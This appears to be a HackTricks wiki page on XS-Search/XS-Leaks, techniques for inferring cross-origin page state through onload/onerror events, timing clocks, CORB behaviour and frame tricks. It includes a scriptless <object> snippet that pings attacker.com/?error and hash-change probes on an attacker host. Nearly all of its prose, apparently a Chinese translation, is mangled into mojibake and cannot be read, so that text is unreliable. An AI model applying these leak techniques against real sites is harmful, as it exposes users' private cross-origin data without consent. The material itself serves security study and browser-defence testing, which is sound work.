# XS-Search/XS-Leaks

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

ä½¿ç”¨ [****](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=xs-search) è½»æ¾æ„å»ºå’Œ **è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œç”±ä¸–ç•Œä¸Š **æœ€å…ˆè¿›** çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=xs-search" %}

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## åŸºæœ¬ä¿¡æ¯

XS-Search æ˜¯ä¸€ç§é€šè¿‡åˆ©ç”¨ **ä¾§ä¿¡é“æ¼æ´** æ¥ **æå–è·¨æºä¿¡æ¯** çš„æ–¹æ³•ã€‚

æ­¤æ”»å‡»æ¶‰åŠçš„å…³é”®ç»„ä»¶åŒ…æ‹¬ï¼š

* **æ˜“å—æ”»å‡»çš„ç½‘é¡µ**ï¼šç›®æ ‡ç½‘ç«™ï¼Œä¿¡æ¯æ—¨åœ¨ä»ä¸­æå–ã€‚
* **æ”»å‡»è€…çš„ç½‘ç«™**ï¼šæ”»å‡»è€…åˆ›å»ºçš„æ¶æ„ç½‘ç«™ï¼Œå—å®³è€…è®¿é—®ï¼Œæ‰˜ç®¡æ¼æ´åˆ©ç”¨ã€‚
* **åŒ…å«æ–¹æ³•**ï¼šç”¨äºå°†æ˜“å—æ”»å‡»çš„ç½‘é¡µçº³å…¥æ”»å‡»è€…ç½‘ç«™çš„æŠ€æœ¯ï¼ˆä¾‹å¦‚ï¼Œwindow.openã€iframeã€fetchã€å¸¦ href çš„ HTML æ ‡ç­¾ç­‰ï¼‰ã€‚
* **æ³„æ¼æŠ€æœ¯**ï¼šç”¨äºæ ¹æ®é€šè¿‡åŒ…å«æ–¹æ³•æ”¶é›†çš„ä¿¡æ¯æ¥è¾¨åˆ«æ˜“å—æ”»å‡»ç½‘é¡µçŠ¶æ€å·®å¼‚çš„æŠ€æœ¯ã€‚
* **çŠ¶æ€**ï¼šæ˜“å—æ”»å‡»ç½‘é¡µçš„ä¸¤ç§æ½œåœ¨æ¡ä»¶ï¼Œæ”»å‡»è€…æ—¨åœ¨åŒºåˆ†ã€‚
* **å¯æ£€æµ‹å·®å¼‚**ï¼šæ”»å‡»è€…ä¾èµ–äºå¯è§‚å¯Ÿçš„å˜åŒ–æ¥æ¨æ–­æ˜“å—æ”»å‡»ç½‘é¡µçš„çŠ¶æ€ã€‚

### å¯æ£€æµ‹å·®å¼‚

å¯ä»¥åˆ†æå¤šä¸ªæ–¹é¢ä»¥åŒºåˆ†æ˜“å—æ”»å‡»ç½‘é¡µçš„çŠ¶æ€ï¼š

* **çŠ¶æ€ç **ï¼šåŒºåˆ† **å„ç§ HTTP å“åº”çŠ¶æ€ç ** è·¨æºï¼Œå¦‚æœåŠ¡å™¨é”™è¯¯ã€å®¢æˆ·ç«¯é”™è¯¯æˆ–èº«ä»½éªŒè¯é”™è¯¯ã€‚
* **API ä½¿ç”¨**ï¼šè¯†åˆ«è·¨é¡µé¢çš„ **Web API ä½¿ç”¨**ï¼Œæ­ç¤ºè·¨æºé¡µé¢æ˜¯å¦ä½¿ç”¨ç‰¹å®šçš„ JavaScript Web APIã€‚
* **é‡å®šå‘**ï¼šæ£€æµ‹å¯¼èˆªåˆ°ä¸åŒé¡µé¢ï¼Œä¸ä»…æ˜¯ HTTP é‡å®šå‘ï¼Œè¿˜æœ‰ç”± JavaScript æˆ– HTML è§¦å‘çš„é‡å®šå‘ã€‚
* **é¡µé¢å†…å®¹**ï¼šè§‚å¯Ÿ **HTTP å“åº”ä½“ä¸­çš„å˜åŒ–** æˆ–é¡µé¢å­èµ„æºä¸­çš„å˜åŒ–ï¼Œä¾‹å¦‚ **åµŒå…¥æ¡†çš„æ•°é‡** æˆ–å›¾åƒçš„å¤§å°å·®å¼‚ã€‚
* **HTTP å¤´**ï¼šæ³¨æ„ **ç‰¹å®š HTTP å“åº”å¤´** çš„å­˜åœ¨æˆ–å¯èƒ½çš„å€¼ï¼ŒåŒ…æ‹¬ X-Frame-Optionsã€Content-Disposition å’Œ Cross-Origin-Resource-Policy ç­‰å¤´ã€‚
* **æ—¶é—´**ï¼šæ³¨æ„ä¸¤ç§çŠ¶æ€ä¹‹é—´çš„ä¸€è‡´æ—¶é—´å·®å¼‚ã€‚

### åŒ…å«æ–¹æ³•

* **HTML å…ƒç´ **ï¼šHTML æä¾›å¤šç§å…ƒç´ ç”¨äº **è·¨æºèµ„æºåŒ…å«**ï¼Œå¦‚æ ·å¼è¡¨ã€å›¾åƒæˆ–è„šæœ¬ï¼Œè¿«ä½¿æµè§ˆå™¨è¯·æ±‚é HTML èµ„æºã€‚å¯ä»¥åœ¨ [https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks) æ‰¾åˆ°æ½œåœ¨ HTML å…ƒç´ çš„æ±‡ç¼–ã€‚
* **æ¡†æ¶**ï¼šå¦‚ **iframe**ã€**object** å’Œ **embed** ç­‰å…ƒç´ å¯ä»¥å°† HTML èµ„æºç›´æ¥åµŒå…¥æ”»å‡»è€…é¡µé¢ã€‚å¦‚æœé¡µé¢ **ç¼ºä¹æ¡†æ¶ä¿æŠ¤**ï¼ŒJavaScript å¯ä»¥é€šè¿‡ contentWindow å±æ€§è®¿é—®æ¡†æ¶èµ„æºçš„çª—å£å¯¹è±¡ã€‚
* **å¼¹å‡ºçª—å£**ï¼š**`window.open`** æ–¹æ³•åœ¨æ–°æ ‡ç­¾é¡µæˆ–çª—å£ä¸­æ‰“å¼€èµ„æºï¼Œä¸º JavaScript æä¾› **çª—å£å¥æŸ„**ï¼Œä»¥ä¾¿ä¸éµå¾ª SOP çš„æ–¹æ³•å’Œå±æ€§è¿›è¡Œäº¤äº’ã€‚å¼¹å‡ºçª—å£é€šå¸¸ç”¨äºå•ç‚¹ç™»å½•ï¼Œç»•è¿‡ç›®æ ‡èµ„æºçš„æ¡†æ¶å’Œ cookie é™åˆ¶ã€‚ç„¶è€Œï¼Œç°ä»£æµè§ˆå™¨é™åˆ¶å¼¹å‡ºçª—å£çš„åˆ›å»ºï¼Œä»…é™äºæŸäº›ç”¨æˆ·æ“ä½œã€‚
* **JavaScript è¯·æ±‚**ï¼šJavaScript å…è®¸ä½¿ç”¨ **XMLHttpRequests** æˆ– **Fetch API** ç›´æ¥è¯·æ±‚ç›®æ ‡èµ„æºã€‚è¿™äº›æ–¹æ³•æä¾›å¯¹è¯·æ±‚çš„ç²¾ç¡®æ§åˆ¶ï¼Œä¾‹å¦‚é€‰æ‹©è·Ÿéš HTTP é‡å®šå‘ã€‚

### æ³„æ¼æŠ€æœ¯

* **äº‹ä»¶å¤„ç†ç¨‹åº**ï¼šXS-Leaks ä¸­çš„ä¸€ç§ç»å…¸æ³„æ¼æŠ€æœ¯ï¼Œäº‹ä»¶å¤„ç†ç¨‹åºå¦‚ **onload** å’Œ **onerror** æä¾›æœ‰å…³èµ„æºåŠ è½½æˆåŠŸæˆ–å¤±è´¥çš„è§è§£ã€‚
* **é”™è¯¯æ¶ˆæ¯**ï¼šJavaScript å¼‚å¸¸æˆ–ç‰¹æ®Šé”™è¯¯é¡µé¢å¯ä»¥ç›´æ¥ä»é”™è¯¯æ¶ˆæ¯ä¸­æä¾›æ³„æ¼ä¿¡æ¯ï¼Œæˆ–é€šè¿‡åŒºåˆ†å…¶å­˜åœ¨ä¸å¦æ¥æä¾›ä¿¡æ¯ã€‚
* **å…¨å±€é™åˆ¶**ï¼šæµè§ˆå™¨çš„ç‰©ç†é™åˆ¶ï¼Œå¦‚å†…å­˜å®¹é‡æˆ–å…¶ä»–å¼ºåˆ¶çš„æµè§ˆå™¨é™åˆ¶ï¼Œå¯ä»¥åœ¨è¾¾åˆ°é˜ˆå€¼æ—¶å‘å‡ºä¿¡å·ï¼Œä½œä¸ºæ³„æ¼æŠ€æœ¯ã€‚
* **å…¨å±€çŠ¶æ€**ï¼šå¯æ£€æµ‹ä¸æµè§ˆå™¨ **å…¨å±€çŠ¶æ€**ï¼ˆä¾‹å¦‚ï¼Œå†å²æ¥å£ï¼‰çš„äº¤äº’å¯ä»¥è¢«åˆ©ç”¨ã€‚ä¾‹å¦‚ï¼Œæµè§ˆå™¨å†å²ä¸­çš„ **æ¡ç›®æ•°é‡** å¯ä»¥æä¾›æœ‰å…³è·¨æºé¡µé¢çš„çº¿ç´¢ã€‚
* **æ€§èƒ½ API**ï¼šè¯¥ API æä¾› **å½“å‰é¡µé¢çš„æ€§èƒ½ç»†èŠ‚**ï¼ŒåŒ…æ‹¬æ–‡æ¡£å’ŒåŠ è½½èµ„æºçš„ç½‘ç»œæ—¶åºï¼Œä½¿å¾—å¯ä»¥æ¨æ–­è¯·æ±‚çš„èµ„æºã€‚
* **å¯è¯»å±æ€§**ï¼šæŸäº› HTML å±æ€§æ˜¯ **è·¨æºå¯è¯»** çš„ï¼Œå¯ä»¥ç”¨ä½œæ³„æ¼æŠ€æœ¯ã€‚ä¾‹å¦‚ï¼Œ`window.frame.length` å±æ€§å…è®¸ JavaScript è®¡ç®—è·¨æºç½‘é¡µä¸­åŒ…å«çš„æ¡†æ¶æ•°é‡ã€‚

## XSinator å·¥å…·ä¸è®ºæ–‡

XSinator æ˜¯ä¸€ä¸ªè‡ªåŠ¨åŒ–å·¥å…·ï¼Œç”¨äº **æ£€æŸ¥æµè§ˆå™¨æ˜¯å¦å­˜åœ¨å¤šç§å·²çŸ¥çš„ XS-Leaks**ï¼Œè¯¦è§å…¶è®ºæ–‡ï¼š[**https://xsinator.com/paper.pdf**](https://xsinator.com/paper.pdf)

æ‚¨å¯ä»¥ **è®¿é—®è¯¥å·¥å…·** [**https://xsinator.com/**](https://xsinator.com/)

{% hint style="warning" %}
**æ’é™¤çš„ XS-Leaks**ï¼šæˆ‘ä»¬ä¸å¾—ä¸æ’é™¤ä¾èµ– **æœåŠ¡å·¥ä½œè€…** çš„ XS-Leaksï¼Œå› ä¸ºå®ƒä»¬ä¼šå¹²æ‰° XSinator ä¸­çš„å…¶ä»–æ³„æ¼ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬é€‰æ‹© **æ’é™¤ä¾èµ–ç‰¹å®š Web åº”ç”¨ç¨‹åºä¸­çš„é…ç½®é”™è¯¯å’Œæ¼æ´çš„ XS-Leaks**ã€‚ä¾‹å¦‚ï¼Œè·¨æºèµ„æºå…±äº«ï¼ˆCORSï¼‰é…ç½®é”™è¯¯ã€postMessage æ³„æ¼æˆ–è·¨ç«™è„šæœ¬ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬è¿˜æ’é™¤äº†åŸºäºæ—¶é—´çš„ XS-Leaksï¼Œå› ä¸ºå®ƒä»¬é€šå¸¸å­˜åœ¨ç¼“æ…¢ã€å˜ˆæ‚å’Œä¸å‡†ç¡®çš„é—®é¢˜ã€‚
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨ [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=xs-search) è½»æ¾æ„å»ºå’Œ **è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œç”±ä¸–ç•Œä¸Š **æœ€å…ˆè¿›** çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=xs-search" %}

## **åŸºäºæ—¶é—´çš„æŠ€æœ¯**

ä»¥ä¸‹ä¸€äº›æŠ€æœ¯å°†ä½¿ç”¨æ—¶é—´ä½œä¸ºæ£€æµ‹ç½‘é¡µå¯èƒ½çŠ¶æ€å·®å¼‚çš„è¿‡ç¨‹çš„ä¸€éƒ¨åˆ†ã€‚æµ‹é‡æ—¶é—´åœ¨ç½‘é¡µæµè§ˆå™¨ä¸­æœ‰ä¸åŒçš„æ–¹æ³•ã€‚

**æ—¶é’Ÿ**ï¼š [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) API å…è®¸å¼€å‘äººå‘˜è·å–é«˜åˆ†è¾¨ç‡çš„æ—¶é—´æµ‹é‡ã€‚\
æ”»å‡»è€…å¯ä»¥æ»¥ç”¨ç›¸å½“æ•°é‡çš„ API æ¥åˆ›å»ºéšå¼æ—¶é’Ÿï¼š[Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast\_Channel\_API)ã€[Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel)ã€[requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame)ã€[setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout)ã€CSS åŠ¨ç”»ç­‰ã€‚\
æ›´å¤šä¿¡æ¯è¯·å‚è§ï¼š[https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/)ã€‚

## äº‹ä»¶å¤„ç†ç¨‹åºæŠ€æœ¯

### Onload/Onerror

* **åŒ…å«æ–¹æ³•**ï¼šæ¡†æ¶ï¼ŒHTML å…ƒç´ 
* **å¯æ£€æµ‹å·®å¼‚**ï¼šçŠ¶æ€ç 
* **æ›´å¤šä¿¡æ¯**ï¼š[https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu)ï¼Œ[https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
* **æ€»ç»“**ï¼šå¦‚æœå°è¯•åŠ è½½èµ„æºï¼Œonerror/onload äº‹ä»¶åœ¨èµ„æºæˆåŠŸ/å¤±è´¥åŠ è½½æ—¶è¢«è§¦å‘ï¼Œå¯ä»¥æ¨æ–­å‡ºçŠ¶æ€ç ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](https://xsinator.com/testing.html#Event%20Handler%20Leak%20\(Script\))

{% content-ref url="cookie-bomb-+-onerror-xs-leak.md" %}
[cookie-bomb-+-onerror-xs-leak.md](cookie-bomb-+-onerror-xs-leak.md)
{% endcontent-ref %}

ä»£ç ç¤ºä¾‹å°è¯• **ä» JS åŠ è½½è„šæœ¬å¯¹è±¡**ï¼Œä½† **å…¶ä»–æ ‡ç­¾** å¦‚å¯¹è±¡ã€æ ·å¼è¡¨ã€å›¾åƒã€éŸ³é¢‘ä¹Ÿå¯ä»¥ä½¿ç”¨ã€‚æ­¤å¤–ï¼Œè¿˜å¯ä»¥ç›´æ¥æ³¨å…¥ **æ ‡ç­¾** å¹¶åœ¨æ ‡ç­¾å†…å£°æ˜ `onload` å’Œ `onerror` äº‹ä»¶ï¼ˆè€Œä¸æ˜¯ä» JS æ³¨å…¥ï¼‰ã€‚

è¯¥æ”»å‡»è¿˜æœ‰ä¸€ä¸ªæ— è„šæœ¬ç‰ˆæœ¬ï¼š
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœ `example.com/404` æœªæ‰¾åˆ°ï¼Œå°†åŠ è½½ `attacker.com/?error`ã€‚

### åŠ è½½æ—¶æœº

* **åŒ…å«æ–¹æ³•**ï¼šHTML å…ƒç´ 
* **å¯æ£€æµ‹å·®å¼‚**ï¼šæ—¶æœºï¼ˆé€šå¸¸ç”±äºé¡µé¢å†…å®¹ã€çŠ¶æ€ç ï¼‰
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
* **æ€»ç»“ï¼š** [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) **API** å¯ç”¨äºæµ‹é‡æ‰§è¡Œè¯·æ±‚æ‰€éœ€çš„æ—¶é—´ã€‚ç„¶è€Œï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–æ—¶é’Ÿï¼Œä¾‹å¦‚ [**PerformanceLongTaskTiming API**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming)ï¼Œå®ƒå¯ä»¥è¯†åˆ«è¿è¡Œè¶…è¿‡ 50 æ¯«ç§’çš„ä»»åŠ¡ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) å¦ä¸€ä¸ªç¤ºä¾‹åœ¨ï¼š

{% content-ref url="performance.now-example.md" %}
[performance.now-example.md](performance.now-example.md)
{% endcontent-ref %}

#### åŠ è½½æ—¶æœº + å¼ºåˆ¶é‡ä»»åŠ¡

æ­¤æŠ€æœ¯ä¸å‰ä¸€ç§ç›¸ä¼¼ï¼Œä½† **æ”»å‡»è€…** è¿˜å°† **å¼ºåˆ¶** ä¸€äº›æ“ä½œä»¥èŠ±è´¹ **ç›¸å…³çš„æ—¶é—´**ï¼Œæ— è®º **ç­”æ¡ˆæ˜¯æ­£é¢è¿˜æ˜¯è´Ÿé¢**ï¼Œå¹¶æµ‹é‡è¯¥æ—¶é—´ã€‚

{% content-ref url="performance.now-+-force-heavy-task.md" %}
[performance.now-+-force-heavy-task.md](performance.now-+-force-heavy-task.md)
{% endcontent-ref %}

### å¸è½½/å¸è½½å‰æ—¶æœº

* **åŒ…å«æ–¹æ³•**ï¼šæ¡†æ¶
* **å¯æ£€æµ‹å·®å¼‚**ï¼šæ—¶æœºï¼ˆé€šå¸¸ç”±äºé¡µé¢å†…å®¹ã€çŠ¶æ€ç ï¼‰
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
* **æ€»ç»“ï¼š** [SharedArrayBuffer æ—¶é’Ÿ](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) å¯ç”¨äºæµ‹é‡æ‰§è¡Œè¯·æ±‚æ‰€éœ€çš„æ—¶é—´ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–æ—¶é’Ÿã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

è·å–èµ„æºæ‰€éœ€çš„æ—¶é—´å¯ä»¥é€šè¿‡åˆ©ç”¨ [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload\_event) å’Œ [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload\_event) äº‹ä»¶æ¥æµ‹é‡ã€‚**`beforeunload`** äº‹ä»¶åœ¨æµè§ˆå™¨å³å°†å¯¼èˆªåˆ°æ–°é¡µé¢æ—¶è§¦å‘ï¼Œè€Œ **`unload`** äº‹ä»¶åœ¨å®é™…è¿›è¡Œå¯¼èˆªæ—¶å‘ç”Ÿã€‚è¿™ä¸¤ä¸ªäº‹ä»¶ä¹‹é—´çš„æ—¶é—´å·®å¯ä»¥è®¡ç®—å‡º **æµè§ˆå™¨è·å–èµ„æºæ‰€èŠ±è´¹çš„æ—¶é—´**ã€‚

### æ²™ç®±æ¡†æ¶æ—¶æœº + åŠ è½½ <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

* **åŒ…å«æ–¹æ³•**ï¼šæ¡†æ¶
* **å¯æ£€æµ‹å·®å¼‚**ï¼šæ—¶æœºï¼ˆé€šå¸¸ç”±äºé¡µé¢å†…å®¹ã€çŠ¶æ€ç ï¼‰
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
* **æ€»ç»“ï¼š** [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) API å¯ç”¨äºæµ‹é‡æ‰§è¡Œè¯·æ±‚æ‰€éœ€çš„æ—¶é—´ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–æ—¶é’Ÿã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

å·²è§‚å¯Ÿåˆ°ï¼Œåœ¨æ²¡æœ‰ [æ¡†æ¶ä¿æŠ¤](https://xsleaks.dev/docs/defenses/opt-in/xfo/) çš„æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯ä»¥æµ‹é‡é¡µé¢åŠå…¶å­èµ„æºåœ¨ç½‘ç»œä¸ŠåŠ è½½æ‰€éœ€çš„æ—¶é—´ã€‚æ­¤æµ‹é‡é€šå¸¸æ˜¯å¯èƒ½çš„ï¼Œå› ä¸º iframe çš„ `onload` å¤„ç†ç¨‹åºä»…åœ¨èµ„æºåŠ è½½å’Œ JavaScript æ‰§è¡Œå®Œæˆåè§¦å‘ã€‚ä¸ºäº†ç»•è¿‡è„šæœ¬æ‰§è¡Œå¼•å…¥çš„å¯å˜æ€§ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šåœ¨ `<iframe>` ä¸­ä½¿ç”¨ [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) å±æ€§ã€‚åŒ…å«æ­¤å±æ€§ä¼šé™åˆ¶è®¸å¤šåŠŸèƒ½ï¼Œç‰¹åˆ«æ˜¯ JavaScript çš„æ‰§è¡Œï¼Œä»è€Œä¿ƒè¿›ä¸»è¦å—ç½‘ç»œæ€§èƒ½å½±å“çš„æµ‹é‡ã€‚
```javascript
// Example of an iframe with the sandbox attribute
<iframe src="example.html" sandbox></iframe>
```
### #ID + error + onload

* **Inclusion Methods**: Frames
* **Detectable Difference**: Page Content
* **More info**:
* **Summary**: å¦‚æœæ‚¨å¯ä»¥åœ¨è®¿é—®æ­£ç¡®å†…å®¹æ—¶ä½¿é¡µé¢å‡ºé”™ï¼Œå¹¶åœ¨è®¿é—®ä»»ä½•å†…å®¹æ—¶ä½¿å…¶æ­£ç¡®åŠ è½½ï¼Œé‚£ä¹ˆæ‚¨å¯ä»¥åˆ›å»ºä¸€ä¸ªå¾ªç¯æ¥æå–æ‰€æœ‰ä¿¡æ¯ï¼Œè€Œæ— éœ€æµ‹é‡æ—¶é—´ã€‚
* **Code Example**:

å‡è®¾æ‚¨å¯ä»¥**æ’å…¥**åŒ…å«**ç§˜å¯†**å†…å®¹çš„**é¡µé¢****åœ¨ä¸€ä¸ª Iframe** ä¸­ã€‚

æ‚¨å¯ä»¥**è®©å—å®³è€…æœç´¢**åŒ…å«â€œ_**flag**_â€çš„æ–‡ä»¶ï¼Œä½¿ç”¨**Iframe**ï¼ˆä¾‹å¦‚åˆ©ç”¨ CSRFï¼‰ã€‚åœ¨ Iframe å†…ï¼Œæ‚¨çŸ¥é“ _**onload äº‹ä»¶**_ å°†**è‡³å°‘æ‰§è¡Œä¸€æ¬¡**ã€‚ç„¶åï¼Œæ‚¨å¯ä»¥**æ›´æ”¹** **iframe** çš„ **URL**ï¼Œä½†åªæ›´æ”¹ **URL** ä¸­ **hash** çš„ **å†…å®¹**ã€‚

ä¾‹å¦‚ï¼š

1. **URL1**: www.attacker.com/xssearch#try1
2. **URL2**: www.attacker.com/xssearch#try2

å¦‚æœç¬¬ä¸€ä¸ª URL **æˆåŠŸåŠ è½½**ï¼Œé‚£ä¹ˆï¼Œå½“**æ›´æ”¹** URL çš„ **hash** éƒ¨åˆ†æ—¶ï¼Œ**onload** äº‹ä»¶**ä¸ä¼šå†æ¬¡è§¦å‘**ã€‚ä½†æ˜¯**å¦‚æœ**é¡µé¢åœ¨**åŠ è½½**æ—¶å‡ºç°æŸç§**é”™è¯¯**ï¼Œé‚£ä¹ˆï¼Œ**onload** äº‹ä»¶å°†**å†æ¬¡è§¦å‘**ã€‚

ç„¶åï¼Œæ‚¨å¯ä»¥**åŒºåˆ†**ä¸€ä¸ª**æ­£ç¡®**åŠ è½½çš„é¡µé¢æˆ–è®¿é—®æ—¶æœ‰**é”™è¯¯**çš„é¡µé¢ã€‚

### Javascript Execution

* **Inclusion Methods**: Frames
* **Detectable Difference**: Page Content
* **More info**:
* **Summary:** å¦‚æœ**é¡µé¢**æ­£åœ¨**è¿”å›****æ•æ„Ÿ**å†…å®¹ï¼Œ**æˆ–**å¯ä»¥ç”±ç”¨æˆ·**æ§åˆ¶**çš„**å†…å®¹**ã€‚ç”¨æˆ·å¯ä»¥åœ¨**è´Ÿé¢æƒ…å†µä¸‹**è®¾ç½®**æœ‰æ•ˆçš„ JS ä»£ç **ï¼Œå¹¶åœ¨æ¯æ¬¡å°è¯•ä¸­**åŠ è½½**åœ¨**`<script>`** æ ‡ç­¾å†…ï¼Œå› æ­¤åœ¨**è´Ÿé¢**æƒ…å†µä¸‹æ”»å‡»è€…çš„**ä»£ç **ä¼šè¢«**æ‰§è¡Œ**ï¼Œè€Œåœ¨**è‚¯å®š**æƒ…å†µä¸‹**ä»€ä¹ˆ**éƒ½ä¸ä¼šè¢«æ‰§è¡Œã€‚
* **Code Example:**

{% content-ref url="javascript-execution-xs-leak.md" %}
[javascript-execution-xs-leak.md](javascript-execution-xs-leak.md)
{% endcontent-ref %}

### CORB - Onerror

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Status Code & Headers
* **More info**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
* **Summary**: **è·¨æºè¯»å–é˜»æ­¢ (CORB)** æ˜¯ä¸€ç§å®‰å…¨æªæ–½ï¼Œé˜²æ­¢ç½‘é¡µåŠ è½½æŸäº›æ•æ„Ÿçš„è·¨æºèµ„æºï¼Œä»¥ä¿æŠ¤å…å—**Spectre**ç­‰æ”»å‡»ã€‚ç„¶è€Œï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨å…¶ä¿æŠ¤è¡Œä¸ºã€‚å½“å—**CORB**ä¿æŠ¤çš„å“åº”è¿”å›å¸¦æœ‰ `nosniff` çš„ _**CORB ä¿æŠ¤**_ `Content-Type` å’Œ `2xx` çŠ¶æ€ç æ—¶ï¼Œ**CORB** ä¼šå‰¥ç¦»å“åº”çš„ä¸»ä½“å’Œå¤´éƒ¨ã€‚è§‚å¯Ÿåˆ°è¿™ä¸€ç‚¹çš„æ”»å‡»è€…å¯ä»¥æ¨æ–­å‡º**çŠ¶æ€ç **ï¼ˆæŒ‡ç¤ºæˆåŠŸæˆ–é”™è¯¯ï¼‰å’Œ `Content-Type`ï¼ˆè¡¨ç¤ºæ˜¯å¦å—åˆ°**CORB**ä¿æŠ¤ï¼‰çš„ç»„åˆï¼Œä»è€Œå¯¼è‡´æ½œåœ¨çš„ä¿¡æ¯æ³„éœ²ã€‚
* **Code Example**:

æŸ¥çœ‹æ›´å¤šä¿¡æ¯é“¾æ¥ä»¥è·å–æœ‰å…³æ”»å‡»çš„æ›´å¤šä¿¡æ¯ã€‚

### onblur

* **Inclusion Methods**: Frames
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
* **Summary**: ä» id æˆ– name å±æ€§æ³„éœ²æ•æ„Ÿæ•°æ®ã€‚
* **Code Example**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

